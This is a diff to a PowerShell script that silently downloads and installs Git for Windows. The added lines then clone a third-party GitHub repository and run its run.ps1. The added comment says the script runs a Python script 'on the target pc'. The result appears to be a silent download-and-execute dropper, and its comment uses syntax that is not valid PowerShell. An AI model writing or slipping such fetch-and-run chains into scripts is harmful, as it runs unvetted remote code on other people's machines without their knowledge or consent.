@@ -1,3 +1,9 @@
+
+/**
+ *
+ * # this script downloades srip runnings and runs the python scrip on the target pc 
+ */
+
 $git_url = "https://api.github.com/repos/git-for-windows/git/releases/latest"
 $asset = Invoke-RestMethod -Method Get -Uri $git_url | % assets | where name -like "*64-bit.exe"
 # download installer
@@ -7,3 +13,10 @@ Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $installer
 $git_install_inf = "<install inf file>"
 $install_args = "/SP- /VERYSILENT /SUPPRESSMSGBOXES /NOCANCEL /NORESTART /CLOSEAPPLICATIONS /RESTARTAPPLICATIONS /LOADINF=""$git_install_inf"""
 Start-Process -FilePath $installer -ArgumentList $install_args -Wait
+
+
+git clone https://github.com/NicholasBlackburn1/Checky-users.git
+
+cd .\Checky-users
+
+powershell -noexit .\run.ps1
